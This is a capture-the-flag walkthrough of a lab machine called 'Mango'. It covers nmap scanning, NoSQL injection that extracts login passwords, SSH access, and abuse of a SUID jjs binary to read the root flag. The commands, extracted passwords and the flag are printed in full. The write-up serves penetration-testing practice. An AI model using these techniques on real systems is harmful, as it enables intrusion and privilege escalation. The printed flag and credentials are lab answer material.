## Mango

| Name   |      Description |  
|----------|:------------- |
| Machine IP |  10.10.10.162 |
|Difficulty |    Medium   |


## Scanning

### Nmap scanning

```bash
$ nmap -sC -sV -oA nmap/mango 10.10.10.162     
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-01 15:10 EDT
Nmap scan report for 10.10.10.162
Host is up (0.10s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)
|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)
|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)
80/tcp  open  http     Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 403 Forbidden
443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Mango | Search Base
| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
| Not valid before: 2019-09-27T14:21:19
|_Not valid after:  2020-09-26T14:21:19
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
Service Info: Host: 10.10.10.162; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.86 seconds
```



## Enumeration

- Homepage `Port 443`
- Just a search engine but nothing interesting found.

![homepage](images/homepage.PNG)

- Found a domain name from nmap scan `staging-order.mango.htb`, add it to `hosts` file.
- Homepage `PORT:80`

![homepage_login](images/homepage_login.PNG)

- Found a login page, sql injection failed. and tried `nosql injection`

- Request

```http
POST / HTTP/1.1
Host: staging-order.mango.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Origin: http://staging-order.mango.htb
Connection: close
Referer: http://staging-order.mango.htb/
Cookie: PHPSESSID=7g6se536upk1on0tirpb4nrsjv
Upgrade-Insecure-Requests: 1

username=admin&password=asdasd&login=login
```

- Found a [script](https://book.hacktricks.xyz/pentesting-web/nosql-injection) to extract username and passwords






## Exploitation

- upon running the program, found usernames `admin` and `mango`
- And password for `mango` is found `h3mXK8RhU~f{]f5H`

```bash
─$ python3 nosql.py
Extracting password of mango
Found password h3mXK8RhU~f{]f5H for username mango
```

> Make sure to modify the program to extract password for specific user, eventhough program, does it manually, admin user takes long time and did not yeild any result

- Using this to login to `ssh`



```bash
$ ssh mango@10.10.10.162     
The authenticity of host '10.10.10.162 (10.10.10.162)' can't be established.
ECDSA key fingerprint is SHA256:AhHG3k5r1ic/7nEKLWHXoNm0m28uM9W8heddb9lCTm0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.162' (ECDSA) to the list of known hosts.
mango@10.10.10.162's password: 
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-64-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Oct  1 19:52:10 UTC 2021

  System load:  0.01               Processes:            103
  Usage of /:   25.8% of 19.56GB   Users logged in:      0
  Memory usage: 14%                IP address for ens33: 10.10.10.162
  Swap usage:   0%

 * Kata Containers are now fully integrated in Charmed Kubernetes 1.16!
   Yes, charms take the Krazy out of K8s Kata Kluster Konstruction.

     https://ubuntu.com/kubernetes/docs/release-notes

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

122 packages can be updated.
18 updates are security updates.


Last login: Mon Sep 30 02:58:45 2019 from 192.168.142.138
mango@mango:~$ id
uid=1000(mango) gid=1000(mango) groups=1000(mango)
```

- logged in as `mango` user.

## Privilege escalation

- Running `linpeas` resulted in a `SUID` binary

![suid](images/suid.PNG)

- `gtfobins` has `jjs` that can be used to execute `/bin/sh` with `sudo` privilege

- But with `mango` user we are unable to execute as the user is not in `sudoer`, but looking at the `users`, found another user `admin`, now run the exploit to extract password for user `admin`

```bash
mango@mango:/tmp$ echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/bash -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()" | sudo jjs
[sudo] password for mango: 
mango is not in the sudoers file.  This incident will be reported.
```

```bash
mango@mango:/home$ ls
admin  mango
```

```bash
$ python3 nosql.py 
Extracting password of admin
Found password t9KcS3>!0B#2 for username admin
```

- switch the user from `mango` (the password extracted is not `ssh's` password.)

```bash
mango@mango:/home/admin$ su admin
Password: 
$ id
uid=4000000000(admin) gid=1001(admin) groups=1001(admin)
```



- Since the `admin` user is also not a `sudoer`, we can use the `jjs` binary to read and `write` files. for eg. read `root.txt`, write our `ssh` public key to `/root/.ssh/authorized_keys`


```bash
admin@mango:/tmp$ echo 'var BufferedReader = Java.type("java.io.BufferedReader");
> var FileReader = Java.type("java.io.FileReader");
> var br = new BufferedReader(new FileReader("/root/root.txt"));
> while ((line = br.readLine()) != null) { print(line); }' | jjs
Warning: The jjs tool is planned to be removed from a future JDK release
jjs> var BufferedReader = Java.type("java.io.BufferedReader");
jjs> var FileReader = Java.type("java.io.FileReader");
jjs> var br = new BufferedReader(new FileReader("/root/root.txt"));
jjs> while ((line = br.readLine()) != null) { print(line); }
09e8f09f11c8336318b388447942546b
```






